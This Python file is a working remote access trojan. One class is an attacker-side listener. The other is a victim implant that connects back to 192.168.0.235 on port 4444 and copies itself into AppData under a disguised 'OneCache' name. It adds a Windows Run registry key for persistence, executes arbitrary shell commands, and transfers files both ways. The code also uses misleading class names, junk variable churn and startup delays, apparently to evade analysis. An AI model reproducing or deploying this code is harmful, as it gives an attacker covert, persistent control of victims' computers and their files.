#!/usr/bin/env python3
#metod subprocess.check_output don't change our working directory, by cd command, it only checks this command as system command
#from bytes to list: -> list(bytearray(byte_object)) ; form list to bytes : -> bytes(list_bytes_ob)

import socket
import subprocess
import json
import os
import random
from time import sleep
import sys
import shutil #to copy stuff in python

class Upgrade:
    def __init__(self , ip , port):
        yandex = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.a1 = 0
        yandex.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)
        self.a2 = None
        yandex.bind((ip , port))
        yandex.listen(5)
        self.a3 = "i am fertdhs"
        print("[+] Waiting incoming connections")
        self.connection,self.adress = yandex.accept()
        print("[+] Got a connection from " + str(self.adress))
    
    def drawing(self,data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def auto_changing(self):
        json_data = ""
        while True:
            try:
                json_data =json_data + self.connection.recv(400000).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def changing_adress(self , command):
        if command[0] == "exit":
            self.drawing(command)
            self.connection.close()
            exit()
        self.drawing(command)
        return self.auto_changing()
    
    def read_file(self,path):
        res_bytes = None
        try:
            with open(path ,'rb') as file:
                res_bytes =  file.read()
        except:
            return "[-] No such file."
        res_bytes = bytearray(res_bytes)
        res_bytes = list(res_bytes)
        return res_bytes

    def write_file(self,path,content):
        #content = bytes(content)
        with open(path , 'wb') as file:
            file.write(content)
            return "[+] Download successful."  

    def change_working_directory_to(self,path):
        try:
            os.chdir(path)    
            return "[+] Changing working LOCAL directory"
        except:
            return "[-] Incorrect Path.Try again!"
    
    def printing_lines(self, task):
        try:
            if task[0] == "cd":
                return self.change_working_directory_to(task[1])
            result = subprocess.check_output(task ).decode()

        except:
            result = "[-] Incorrect Local command.Try again!!!"
        return result

    def empty_string(self,string_ob):
        res = ""
        for symbol in string_ob:
            if not(symbol == ' '):
                res += symbol
        return len(res) == 0

    def run(self):
        while True:
            command  = input(">> ")
            if command.startswith("--no_split"):
                command = command[11:]
                command = [command]
            elif command.startswith("cd") and len(command) > 4:
                command = command[3:]
                command = ["cd",command]
            elif self.empty_string(command):
                continue
            else:
                command = command.split()

            if command[0] == "download":
                self.drawing(command)
                file_bytes = self.auto_changing()
                try:
                    message = file_bytes
                    if message.startswith("[-] No such file."):
                        print(message)
                        continue
                except:
                    True

                file_bytes = bytes(file_bytes)
                result = self.write_file(command[1] , file_bytes)
                print(result)
                continue

            if command[0] == "upload":
                content = self.read_file(command[1])
                if content == "[-] No such file.":
                    print(content)
                    continue
                command.append(content)
            if command[0] == "-l" or command[0] == "--local":
                command = command[1:]
                result = self.printing_lines(command)
                print(result)
                continue
            
            result = self.changing_adress(command)
            print(result)
   

class Normal:
    
    def __init__(self, ip ,port):
        self.makelist = [932,34,233,90, 'Gfqwert',(12,10),[1,23,23,23,23,23,23],"lfksdkfskfjkdsj",[10]*100]
        self.my_function()
        self.stream = "QWRTXESDJKSDNSJKDSNKSJDSUJDSJDNSJKDUSHCBCUSSSCBUBCUSCBSUFDSGFSUFGSJBCJSCJSDSDHD"
        self.number = 3498324832948234823482384
        self.lst = [1,2,3,12,435,67,6,98,67,76,45,345,35,76,767,4657,34657,46,7,46,56,46,46,535,35,353,3,4546,3,5,46,4563,5435,46,35,35,353,53]
        self.connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        while True:
            try:
                self.lst = [random.randint(0,100) for _ in range(100)]
                self.connection.connect((ip, port))
                self.lst = [random.randint(0,100) for _ in range(100)]
                break
            except:
                sleep(2)
                continue
    def my_function(self):
        my_dog = os.environ["appdata"] + "\\OneCache"
        if not os.path.exists(my_dog):
            subprocess.call(f"mkdir {my_dog}", shell = True)
            my_dog += "\\OneCahce.exe"
            self.makelist = [random.randint(0,67) for _ in range(100)]
            shutil.copyfile(sys.executable , my_dog)
            self.lst = [random.randint(0,67) for _ in range(100)]
            sleep(1)
            self.stream = "lkjegirjtiorejtrgetjretrjetiurheotQEWQWYTFJKHJHGFRJEOEIOJDIWJOWOEEE"
            subprocess.call(f'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "OneCache" /t REG_SZ /d "{my_dog}"')
            sleep(1)
            self.number = 9834573485743857984331231231231570

    def make_changes(self, command):
        try:
            #DEVNULL = open(os.devnull , 'wb')
            result = subprocess.check_output(command, shell = True)
        except:
            result = "[-] Incorrect victim command. Try Again!"
        return result

    def drawing(self,data):
        self.stream = "lkjegirjtiorejtrgetjr4839579834mn3g93485getrjetiurheotQEWQWYTFJKHJHGFRJEOEIOJDIWJOWOEEE"
        json_data = json.dumps(data).encode()
        self.lst = [random.randint(0,67) for _ in range(100)]
        self.connection.send(json_data)

    def auto_changing(self):
        json_data = ""
        self.stream = "lkjegirjtiorejtrgetjretrjetiurheotQEWQWYTFJKHJHGFRiirtu87435645764562938JEOEIOJDIWJOWOEEE"
        while True:
            try:
                self.number = random.randint(0,1000)
                json_data =json_data + self.connection.recv(400000).decode()
                self.number = random.randint(12,144)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory_to(self,path):
        try: 
            os.chdir(path)    
            return "[+] Changing victim working directory to " + path
        except:
            return "[-] Incorrect path. Try Again!"

    def read_file(self,path):
        res_bytes = None
        try:
            with open(path ,'rb') as file:
                res_bytes =  file.read()
        except:
            return "[-] No such file."
        res_bytes = bytearray(res_bytes)
        res_bytes = list(res_bytes)
        return res_bytes

    def write_file(self,path,content):
        #content = bytes(content)
        with open(path , 'wb') as file:
            file.write(content)
            return "[+] Upload successful."  
    
    def background_execute(self,command):
        self.lst = [random.randint(0,67) for _ in range(100)]
        self.makelist = [0,1,2,3,12,32,454]
        subprocess.Popen(command , shell = True)
        self.lst = [random.randint(0,32) for _ in range(100)]
        return "[+] Command startes in background"

    def run(self):
        while True:
            command = self.auto_changing()
            if command[0] == "exit":
                self.connection.close()
                sys.exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                file_bytes = self.read_file(command[1])
                self.drawing(file_bytes)
                continue
            elif command[0] == "upload":
                content = bytes(command[2])
                command_result = self.write_file(command[1] , content)
            elif command[0] == "&":
                command = command[1:]
                command_result = self.background_execute(command)
            else:
                command_result = self.make_changes(command)
                if not isinstance(command_result , str):
                    command_result = command_result.decode('cp1251')
            self.drawing(command_result)

def go_to_dirictory():
    content = os.listdir()
    sleep(10)
    return content
number = 0
for _ in range(50000):
    number += 1
number = None
cnt  =  0
while cnt != 15:
    curr_cnt = cnt
    curr_dir = os.getcwd()
    cnt += ((((cnt  + 1) * 100) % 60) * 200 ) % 43
    sleep(2)
    if cnt == 14:
        content = go_to_dirictory()
    cnt = curr_cnt + 1

client = Normal("192.168.0.235" , 4444)
client.run()      

